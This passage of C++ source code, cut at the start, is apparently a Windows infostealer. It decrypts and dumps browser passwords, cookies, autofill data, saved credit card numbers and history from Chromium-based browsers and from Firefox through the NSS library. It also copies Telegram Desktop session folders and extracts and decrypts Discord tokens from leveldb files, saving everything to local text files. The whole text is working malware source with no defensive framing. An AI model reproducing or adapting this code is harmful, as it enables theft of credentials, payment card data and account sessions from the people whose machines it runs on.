            sqlite3_stmt* stmt;

            if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    ofs << "Form: " << (const char*)sqlite3_column_text(stmt, 0) << " = " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
                }
                sqlite3_finalize(stmt);
            }

            const char* tables[] = {"autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"};
            for (const char* table : tables) {
                std::string col = strstr(table, "name") ? "first_name" : (strstr(table, "email") ? "email" : "number");
                std::string sql = "SELECT guid, " + col + " FROM " + table;
                if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        ofs << table << " (" << (const char*)sqlite3_column_text(stmt, 0) << "): " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
                    }
                    sqlite3_finalize(stmt);
                }
            }

            if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* name = (const char*)sqlite3_column_text(stmt, 0);
                    int m = sqlite3_column_int(stmt, 1);
                    int y = sqlite3_column_int(stmt, 2);
                    const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
                    int blob_size = sqlite3_column_bytes(stmt, 3);

                    std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
                    if (!dec.empty()) {
                        ofs << "Card: " << (name ? name : "") << " | Exp: " << m << "/" << y << " | Num: " << std::string(dec.begin(), dec.end()) << "\n";
                    }
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
        }
    }
}

void extract_history(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
    fs::path db_path = profile_path / "History";
    if (!fs::exists(db_path)) return;

    sqlite3* db;
    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ofstream ofs(output_dir / "history.txt");
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* title = (const char*)sqlite3_column_text(stmt, 1);
                int count = sqlite3_column_int(stmt, 2);
                ofs << "URL: " << (url ? url : "") << " | Title: " << (title ? title : "") << " | Visits: " << count << "\n";
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
}

void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir) {
    std::vector<uint8_t> v10_key;
    bool is_dpapi = false;
    get_v10_key(user_data_dir, v10_key, is_dpapi);

    fs::path user_data(user_data_dir);
    fs::path output_root(config.output_dir);
    fs::create_directories(output_root);

    bool is_opera = config.name.find("Opera") != std::string::npos || config.name.find("Yandex") != std::string::npos;

    for (const auto& entry : fs::directory_iterator(user_data)) {
        if (entry.is_directory()) {
            bool is_profile = fs::exists(entry.path() / "Preferences") ||
                             fs::exists(entry.path() / "Cookies") ||
                             fs::exists(entry.path() / "Network" / "Cookies") ||
                             fs::exists(entry.path() / "Ya Passman Data");

            if (is_profile) {
                std::string profile_name = entry.path().filename().string();
                std::cout << "Extracting data for profile: " << profile_name << std::endl;
                fs::path profile_output = output_root / profile_name;
                fs::create_directories(profile_output);

                extract_passwords(entry.path(), profile_output, v10_key, v20_key, config.temp_prefix, is_opera);
                extract_cookies(entry.path(), profile_output, v10_key, v20_key, config.temp_prefix, is_opera);
                extract_autofill(entry.path(), profile_output, v10_key, v20_key, config.temp_prefix, is_opera);
                extract_history(entry.path(), profile_output, config.temp_prefix);
            }
        }
    }
    std::cout << "Extraction complete for " << config.name << ". Data saved in " << config.output_dir << " folder." << std::endl;
}


std::string to_narrow_string(const wchar_t* w_str) {
    if (!w_str) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, NULL, 0, NULL, NULL);
    if (size <= 0) return "";
    std::string res(size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w_str, -1, &res[0], size, NULL, NULL);
    if (!res.empty() && res.back() == '\0') res.pop_back();
    return res;
}
// Final check

void extract_firefox_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
    fs::path db_path = profile_path / "cookies.sqlite";
    if (!fs::exists(db_path)) return;

    sqlite3* db;
    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT host, name, value, path FROM moz_cookies";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ofstream ofs(output_dir / "cookies.txt");
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* host = (const char*)sqlite3_column_text(stmt, 0);
                const char* name = (const char*)sqlite3_column_text(stmt, 1);
                const char* value = (const char*)sqlite3_column_text(stmt, 2);
                const char* path = (const char*)sqlite3_column_text(stmt, 3);
                ofs << "Host: " << (host ? host : "") << " | Name: " << (name ? name : "") << " | Value: " << (value ? value : "") << " | Path: " << (path ? path : "") << "\n";
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
}

void extract_firefox_history(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
    fs::path db_path = profile_path / "places.sqlite";
    if (!fs::exists(db_path)) return;

    sqlite3* db;
    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ofstream ofs(output_dir / "history.txt");
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0);
                const char* title = (const char*)sqlite3_column_text(stmt, 1);
                int count = sqlite3_column_int(stmt, 2);
                ofs << "URL: " << (url ? url : "") << " | Title: " << (title ? title : "") << " | Visits: " << count << "\n";
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
}

void extract_firefox_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
    fs::path db_path = profile_path / "formhistory.sqlite";
    if (!fs::exists(db_path)) return;

    sqlite3* db;
    if (open_db_readonly(db_path, &db) == SQLITE_OK) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT fieldname, value FROM moz_formhistory";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ofstream ofs(output_dir / "autofill.txt");
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* name = (const char*)sqlite3_column_text(stmt, 0);
                const char* value = (const char*)sqlite3_column_text(stmt, 1);
                ofs << "Field: " << (name ? name : "") << " = " << (value ? value : "") << "\n";
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
}

void extract_firefox_passwords(const fs::path& profile_path, const fs::path& output_dir, const fs::path& nss_dir);

void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_data_dir) {
    fs::path user_data(user_data_dir);
    fs::path output_root(config.output_dir);
    fs::create_directories(output_root);

    fs::path nss_dir;
    for (const auto& path : config.exe_paths) {
        if (fs::exists(path)) {
            nss_dir = fs::path(path).parent_path();
            break;
        }
    }

    for (const auto& entry : fs::directory_iterator(user_data)) {
        if (entry.is_directory()) {
            fs::path profile_path = entry.path();
            if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
                std::string profile_name = profile_path.filename().string();
                std::cout << "Extracting Firefox data for profile: " << profile_name << std::endl;
                fs::path profile_output = output_root / profile_name;
                fs::create_directories(profile_output);

                extract_firefox_cookies(profile_path, profile_output, config.temp_prefix);
                extract_firefox_history(profile_path, profile_output, config.temp_prefix);
                extract_firefox_autofill(profile_path, profile_output, config.temp_prefix);

                if (!nss_dir.empty()) {
                    extract_firefox_passwords(profile_path, profile_output, nss_dir);
                }
            }
        }
    }
    std::cout << "Firefox extraction complete for " << config.name << ". Data saved in " << config.output_dir << " folder." << std::endl;
}

typedef enum {
    SECSuccess = 0,
    SECFailure = -1
} SECStatus;

typedef struct SECItemStr {
    int type;
    unsigned char *data;
    unsigned int len;
} SECItem;

typedef SECStatus (*PK11_AuthenticatePtr)(void *slot, int load_tokens, void *wincxt);
typedef void *(*PK11_GetInternalKeySlotPtr)();
typedef void (*PK11_FreeSlotPtr)(void *slot);
typedef SECStatus (*NSS_InitPtr)(const char *configdir);
typedef SECStatus (*NSS_ShutdownPtr)();
typedef SECStatus (*PK11SDR_DecryptPtr)(SECItem *data, SECItem *result, void *cx);

struct NSS_Functions {
    HMODULE h_nss;
    NSS_InitPtr NSS_Init;
    NSS_ShutdownPtr NSS_Shutdown;
    PK11_GetInternalKeySlotPtr PK11_GetInternalKeySlot;
    PK11_FreeSlotPtr PK11_FreeSlot;
    PK11_AuthenticatePtr PK11_Authenticate;
    PK11SDR_DecryptPtr PK11SDR_Decrypt;
};

bool load_nss(const fs::path& nss_path, NSS_Functions& f) {
    SetDllDirectoryW(nss_path.wstring().c_str());
    f.h_nss = LoadLibraryW((nss_path / "nss3.dll").wstring().c_str());
    if (!f.h_nss) return false;

    f.NSS_Init = (NSS_InitPtr)GetProcAddress(f.h_nss, "NSS_Init");
    f.NSS_Shutdown = (NSS_ShutdownPtr)GetProcAddress(f.h_nss, "NSS_Shutdown");
    f.PK11_GetInternalKeySlot = (PK11_GetInternalKeySlotPtr)GetProcAddress(f.h_nss, "PK11_GetInternalKeySlot");
    f.PK11_FreeSlot = (PK11_FreeSlotPtr)GetProcAddress(f.h_nss, "PK11_FreeSlot");
    f.PK11_Authenticate = (PK11_AuthenticatePtr)GetProcAddress(f.h_nss, "PK11_Authenticate");
    f.PK11SDR_Decrypt = (PK11SDR_DecryptPtr)GetProcAddress(f.h_nss, "PK11SDR_Decrypt");

    return f.NSS_Init && f.NSS_Shutdown && f.PK11_GetInternalKeySlot && f.PK11_FreeSlot && f.PK11_Authenticate && f.PK11SDR_Decrypt;
}

bool is_hex_string(const std::string& s) {
    if (s.length() != 16) return false;
    return std::all_of(s.begin(), s.end(), [](unsigned char c) { return std::isxdigit(c); });
}

void extract_telegram_session() {
    wchar_t* appdata;
    if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) != S_OK) return;

    fs::path tdata_path = fs::path(appdata) / L"Telegram Desktop" / L"tdata";
    CoTaskMemFree(appdata);

    if (!fs::exists(tdata_path)) return;

    fs::path output_root("Telegram");
    fs::path output_tdata = output_root / "tdata";
    fs::create_directories(output_tdata);

    try {
        // Essential root files
        std::vector<std::string> root_files = {"key_datas", "map0", "map1", "settingss"};
        for (const auto& f : root_files) {
            fs::path src = tdata_path / f;
            if (fs::exists(src)) {
                fs::copy(src, output_tdata / f, fs::copy_options::overwrite_existing);
            }
        }

        // Session folders (16-char hex)
        for (const auto& entry : fs::directory_iterator(tdata_path)) {
            if (entry.is_directory()) {
                std::string folder_name = entry.path().filename().string();
                if (is_hex_string(folder_name)) {
                    fs::path dest = output_tdata / folder_name;
                    fs::create_directories(dest);

                    // Copy everything inside the hex folder (usually small session files)
                    for (const auto& sub_entry : fs::recursive_directory_iterator(entry.path())) {
                        auto rel_path = fs::relative(sub_entry.path(), entry.path());
                        fs::path sub_dest = dest / rel_path;

                        if (sub_entry.is_directory()) {
                            fs::create_directories(sub_dest);
                        } else {
                            // Avoid copying large log files or dumps if they exist here
                            std::string filename = sub_entry.path().filename().string();
                            if (filename.find(".log") == std::string::npos && filename.find("dumps") == std::string::npos) {
                                fs::copy(sub_entry.path(), sub_dest, fs::copy_options::overwrite_existing);
                            }
                        }
                    }
                }
            }
        }
        std::cout << "Telegram session extraction complete. Saved to Telegram/tdata" << std::endl;
    } catch (const std::exception& e) {
        std::cerr << "Telegram extraction error: " << e.what() << std::endl;
    }
}

void extract_discord_tokens(const std::wstring& discord_path_w, const std::string& output_name) {
    fs::path discord_path(discord_path_w);
    if (!fs::exists(discord_path)) return;

    std::vector<uint8_t> master_key;
    bool is_dpapi;
    if (!get_v10_key(discord_path_w, master_key, is_dpapi)) return;

    fs::path leveldb_path = discord_path / "Local Storage" / "leveldb";
    if (!fs::exists(leveldb_path)) return;

    std::set<std::string> tokens;
    // Discord tokens regex patterns
    std::regex enc_regex("dQw4w9WgXcQ:([^\"\\s\\x00-\\x1F]+)");
    std::regex plain_regex("[a-zA-Z0-9_-]{24,28}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{25,110}");

    for (const auto& entry : fs::directory_iterator(leveldb_path)) {
        std::string ext = entry.path().extension().string();
        if (ext == ".log" || ext == ".ldb") {
            std::ifstream ifs(entry.path(), std::ios::binary);
            if (ifs) {
                std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());

                // Scan for encrypted tokens
                auto enc_begin = std::sregex_iterator(content.begin(), content.end(), enc_regex);
                auto enc_end = std::sregex_iterator();
                for (auto i = enc_begin; i != enc_end; ++i) {
                    std::string enc_val = (*i)[1].str();
                    // Handle trailing chars if any
                    if (!enc_val.empty() && enc_val.back() == '\\') enc_val.pop_back();

                    std::vector<uint8_t> enc_bytes = base64_decode(enc_val);
                    if (!enc_bytes.empty()) {
                        // Discord encrypted tokens in leveldb are v10 blobs (AES-GCM)
                        std::vector<uint8_t> dec = decrypt_blob(enc_bytes, master_key, {}, false);
                        if (!dec.empty()) {
                            tokens.insert(std::string(dec.begin(), dec.end()));
                        }
                    }
                }

                // Scan for plain tokens
                auto plain_begin = std::sregex_iterator(content.begin(), content.end(), plain_regex);
                auto plain_end = std::sregex_iterator();
                for (auto i = plain_begin; i != plain_end; ++i) {
                    tokens.insert((*i).str());
                }
            }
        }
    }

    if (!tokens.empty()) {
        fs::path out_root("discord_extract");
        fs::path out_dir = out_root / output_name;
        fs::create_directories(out_dir);
        std::ofstream ofs(out_dir / "tokens.txt");
        for (const auto& token : tokens) {
            ofs << token << "\n";
        }
        std::cout << "Extracted " << tokens.size() << " Discord tokens from " << output_name << std::endl;
    }
}

void extract_firefox_passwords(const fs::path& profile_path, const fs::path& output_dir, const fs::path& nss_dir) {
    NSS_Functions nss;
    if (!load_nss(nss_dir, nss)) return;

    if (nss.NSS_Init(profile_path.string().c_str()) == SECSuccess) {
        void* slot = nss.PK11_GetInternalKeySlot();
        if (slot) {
            if (nss.PK11_Authenticate(slot, TRUE, NULL) == SECSuccess) {
                fs::path logins_path = profile_path / "logins.json";
                std::ifstream ifs(logins_path);
                if (ifs.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
                    std::ofstream ofs(output_dir / "passwords.txt");

                    size_t pos = 0;
                    while ((pos = content.find("\"hostname\":\"", pos)) != std::string::npos) {
                        pos += 12;
                        size_t end = content.find("\"", pos);
                        std::string host = content.substr(pos, end - pos);

                        pos = content.find("\"encryptedUsername\":\"", pos);
                        pos += 21;
                        end = content.find("\"", pos);
                        std::string enc_user = content.substr(pos, end - pos);

                        pos = content.find("\"encryptedPassword\":\"", pos);
                        pos += 21;
                        end = content.find("\"", pos);
                        std::string enc_pass = content.substr(pos, end - pos);

                        auto user_data = base64_decode(enc_user);
                        auto pass_data = base64_decode(enc_pass);

                        SECItem user_item = { 0, user_data.data(), (unsigned int)user_data.size() };
                        SECItem pass_item = { 0, pass_data.data(), (unsigned int)pass_data.size() };
                        SECItem dec_user = { 0, NULL, 0 };
                        SECItem dec_pass = { 0, NULL, 0 };

                        if (nss.PK11SDR_Decrypt(&user_item, &dec_user, NULL) == SECSuccess &&
                            nss.PK11SDR_Decrypt(&pass_item, &dec_pass, NULL) == SECSuccess) {
                            ofs << "URL: " << host << "\nUser: " << std::string((char*)dec_user.data, dec_user.len)
                                << "\nPass: " << std::string((char*)dec_pass.data, dec_pass.len) << "\n---\n";
                        }
                        pos = end;
                    }
                }
            }
            nss.PK11_FreeSlot(slot);
        }
        nss.NSS_Shutdown();
    }
    FreeLibrary(nss.h_nss);
}
